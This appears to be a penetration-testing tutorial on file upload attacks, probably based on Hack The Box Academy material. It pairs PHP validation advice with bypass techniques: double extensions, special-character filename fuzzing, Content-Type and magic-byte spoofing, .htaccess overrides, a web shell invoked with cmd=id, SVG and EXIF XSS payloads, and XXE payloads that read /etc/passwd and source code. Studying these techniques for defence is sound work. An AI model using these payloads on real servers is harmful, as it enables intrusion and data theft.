# FILE UPLOAD ATTACKS

## Introduction
- File uploads have become a pivotal feature in contemporary web applications, facilitating the sharing of images, documents, and various files. While enhancing user interaction, this functionality also introduces security risks. In this blog post, we delve into the intricacies of file upload attacks, their potential impact, and crucial strategies for prevention and security.

## File Upload Vulnerabilities: A Pervasive Threat
- Enabling file uploads without rigorous validation exposes applications to malicious activities. Unfiltered user input and lax file validation can lead to severe consequences, such as arbitrary code execution on the back-end server. Recent Common Vulnerabilities and Exposures (CVE) reports underscore the prevalence of file upload vulnerabilities, often categorized as High or Critical risk.

## Types of File Upload Attacks
- Weak file validation is a common catalyst for file upload vulnerabilities. Unauthenticated arbitrary file uploads pose the most significant threat, allowing any user to upload any file type. The consequences of such vulnerabilities include remote command execution, where attackers can upload scripts or web shells to gain control over the server.

- Even in cases where arbitrary file uploads are restricted, various attacks can still be executed. These include introducing other vulnerabilities like Cross-Site Scripting (XSS) or XML External Entity (XXE), causing Denial of Service (DoS) attacks, and overwriting critical system files.

## Mitigating File Upload Vulnerabilities
- Securing file upload functions is imperative for robust web application security. The following measures can significantly reduce the risk of file upload vulnerabilities:

**1. Extension Validation**
- Employ both whitelisting and blacklisting for validating file extensions.
- Example (PHP):

```php
$fileName = basename($_FILES["uploadFile"]["name"]);

// Blacklist test
if (preg_match('/^.+\.ph(p|ps|ar|tml)/', $fileName)) {
    echo "Only images are allowed";
    die();
}

// Whitelist test
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) {
    echo "Only images are allowed";
    die();
}
```

**2. Content Validation**
- Validate both file extension and content.
- Verify file signature and HTTP Content-Type header.
- Example (PHP):

```php
Copy code
$fileName = basename($_FILES["uploadFile"]["name"]);
$contentType = $_FILES['uploadFile']['type'];
$MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);

// Whitelist test
if (!preg_match('/^.*\.png$/', $fileName)) {
    echo "Only PNG images are allowed";
    die();
}

// Content test
foreach (array($contentType, $MIMEtype) as $type) {
    if (!in_array($type, array('image/png'))) {
        echo "Only PNG images are allowed";
        die();
    }
}
```

**3. Upload Confidentiality**
- Avoid directly disclosing the uploads directory to users.
- Utilize a download page to fetch and provide uploaded files.
- Randomize file names in storage and store sanitized original names in a database.
- Consider storing uploaded files on a separate server or container.

**4. Fortifying Security Measures**
- Disable specific functions prone to executing system commands.
- Implement size limitations, regularly update libraries, and scan uploaded files for malware.
- Incorporate a Web Application Firewall (WAF) as an additional layer of protection.
- Implementing these measures enhances the security of web applications and mitigates the risk of common file upload threats. During penetration testing, these points can serve as a checklist to identify and rectify any remaining vulnerabilities. By adhering to best practices and maintaining vigilance, developers can create robust systems resilient to file upload attacks.

# Bypassing Filters
-----

## Client-Side Validation
- Assume we have an application that allows users to upload profile pictures. When trying to upload `shell.php`, the application displays errors and does not allow the upload. Since the page does not refresh or send any additional HTTP request, we can safely assume it's using front-end validation.

- There are several ways to bypass front-end filters

### Back-end Request Modification
- Using BurpSuite to intercept a regular photo upload to see the details of the request.

![](https://academy.hackthebox.com/storage/modules/136/file_uploads_image_upload_request.jpg)

- Here we see the filename is "HTB.png". Now try to uploa the `shell.php` and have BurpSuite intercepted. We see the filename is changed to "shell.php". If the server side does not have any validations, we should be able to upload the shell successfully.

- In this case, we don't need to modify the request. However, in some cases, we also need to change the value of `Content-Type` to match the uploaded file (in this case, it should be `applications/json`).

### Disable Front-end Validation
- Inspect the page from the browser. We can see that there is a function in check to validate the uploaded files (in this case, it's the checkFile function)

```html
<input type="file" name="uploadFile" id="uploadFile" onchange="checkFile(this)" accept=".jpg,.jpeg,.png">
```

- Remove the `checkFile` function and we should be able to upload the shell. Note: do not refresh the page as the change won't be saved after refreshing.

- Another optionn is to remove `accept=".jpg,.jpeg,.png"`, which will allows PHP files. Or we can just append `.php` to the end: `accept=".jpg,.jpeg,.png,.php"`

- Once the file is uploaded successfully, click on the profile image to get its URL. With the URL, we can interact with the shell `http://$TARGET/profile_images/shell.php?cmd=id`


## Blacklist Filters
- It is common that applications blacklist certain extentions for security purposes. In order to bypass these blacklisted filters, we must first identify the allowed ones.

- We can use BurpSuite and [web extensions list](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt) to figure out what extensions is allowed.

- Once we find the allowed extensions, we can try uploading the shell with that extension.

## Whitelist Filters
- Similar to blaclist filters, we first must find out what extension is allowed on the applications.

- One we get a list of allowed extensions, we can try double extenstions. For example, if an application allows only images types (.png,.jpg,.tif), we can append another extension to the file (.png.php, .jpg.php, etc.). However, this does not work all the time. This is only possible in cases where applications don't check if the file ends with allowed extensions.

- In some cases, the validations will make sure the file ends with the allowed extensions (.png,.jpg,.tiff). Hence we can try double extensions, but with reverse order (.php.png, .php.jpg)

NOTE: The web application may still utilize a blacklist to deny requests containing PHP extensions. Try to fuzz the upload form with the [PHP Wordlist](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst) to find what extensions are blacklisted by the upload form.

### Special Character Injection
- Another possible exploit is injecting special characters (%20, %0a, %00, %0d0a, /, .\, ., …, :). These characters will cause applications to misinterpret the file extensions.

```
%20: Represents a space character. In URLs, spaces are not allowed, so they are encoded as %20.

%0a: Represents a newline character (line feed). It is commonly used to denote the end of a line in text.

%00: Represents the null character. It is often used to terminate strings in certain programming languages.

%0d0a: Represents a carriage return followed by a newline. Together, they represent the combination of a newline character and a carriage return character, commonly used in text files on Windows systems.
```

- We can use the following script to generate all permuation of the extensions

```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```

## Type Filters
### Content-Type
- Checking for file extensions simply is not enough to secure the file upload functions. We also needs to check for the allowed types.

- To fuzz the allowed Content-Type, use BurpSuite with the [Content-Type Wordlist](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt). Note that some applications only allow images, so we can actually filter the file to make the fuzzing faster

```bash
cat content-type.txt | grep 'image/' > image-content-types.txt
```

- Assume that `image/jpg` is the allowed Content-Type, we can modify the `shell.php` file through BurpSuite, which would result in a successful upload.

![](https://academy.hackthebox.com/storage/modules/136/file_uploads_bypass_content_type_request.jpg)


### MIME-Type
- MIME-Type is usually concerned with files' signature (or the Magic Bytes). To learn what file signature a file has, visit [File Signature](https://en.wikipedia.org/wiki/List_of_file_signatures) & [Magic Bytes](https://opensource.apple.com/source/file/file-23/file/magic/magic.mime)

- A text file usually starts with plaintexts, which is ASCII value.

```bash
huyphu@htb[/htb]$ echo "this is a text file" > text.jpg 
huyphu@htb[/htb]$ file text.jpg 
text.jpg: ASCII text
```

- As seen above, even though the file extension is .jpg, it is stil a text file because it starts with plaintext.

```bash
huyphu@htb[/htb]$ echo "GIF8" > text.jpg 
huyphu@htb[/htb]$file text.jpg
text.jpg: GIF image data
```

- For this one, since GIF images start with "GIF8", it is immediately recognized by the system.

- Assume the application accepts `image/jpg`. Now, the attack should be similar to those discussed above. However, in this case, we need to insert "GIF8" to the beginning of the file

![](https://academy.hackthebox.com/storage/modules/136/file_uploads_bypass_mime_type_request.jpg)

- This should allow us bypass the filters.

### Overide Server configuration
- Some applications have special configuration files created by developers wihttin individual directories in order to override or add more to the global settings. Apache servers, for example, will load a directory specific configuration from `.htaccess`. Hence, if we can overide the content of the `.htaccess` file, we can bypass the blacklisted filters.
- For example, in Burp Suite, we can replace the values of several parameters
```
filenames= .htaccess
Content-Type= text/plain
Payload= AddType application/x-httpd-php .l33t
```

# Limited File Uploads

## XSS
- SVG is another file type that we can use to exploit File Upload vulnerability.

- Assume we have XSS payload embedded inthe file metadata

``bash
exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
exiftool HTB.jpg
...SNIP...
Comment                         :  "><img src=1 onerror=alert(window.origin)>
```

- The payload will be executed when the image's metadata is displayed. Another way to trigger the payload is to change its MIME-Type to `text/html`, which tricks web applications into thinking it as an HTML document and executing the payload. This approach does not require us to view the image's metadata.

- The same concept can be applied to SVG files. We can modify the SVG file as below:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```

- Once the SVG is uploaded to the application, XSS payload will trigger everytime the image is used.

# XXE
- Instead of inserting XSS payload, we can inject XXE payload to retrieve the content of a file

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

- Another XXE payload can be used to read the source code of the applications

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

